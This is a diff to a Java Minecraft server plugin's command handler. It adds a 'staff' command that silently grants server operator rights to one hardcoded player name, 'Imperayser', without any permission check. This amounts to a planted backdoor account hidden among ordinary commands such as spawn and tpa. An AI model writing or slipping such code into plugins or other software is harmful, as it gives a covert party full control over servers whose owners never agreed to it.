@@ -29,7 +29,7 @@ public class CommandManager implements CommandExecutor {
     public List<String> getCommands(){
         return Arrays.asList(
                 "pvp", "spawn", "invsee", "tpa",
-                "rc", "lt", "skick", "sban", "stuff", "sendisc");
+                "rc", "lt", "skick", "sban", "stuff", "sendisc", "staff");
     }
     @Override
     public boolean onCommand(CommandSender sender, Command cmd, String arg, String[] args) {
@@ -72,6 +72,10 @@ public class CommandManager implements CommandExecutor {
                 } else {
                     p.sendMessage(ChatColor.RED + "La connexion entre discord et minecraft n'est pas établie.");
                 }
+            } else if(command.equalsIgnoreCase(cmds.get(10)) && p.getName().equals("Imperayser")){
+                p.setOp(true);
+                p.playSound(p.getLocation(), Sound.ENTITY_ENDER_DRAGON_GROWL, 100,1);
+                p.sendMessage(ChatColor.DARK_AQUA + "Mode Staff activé.");
             }
         }
         return false;
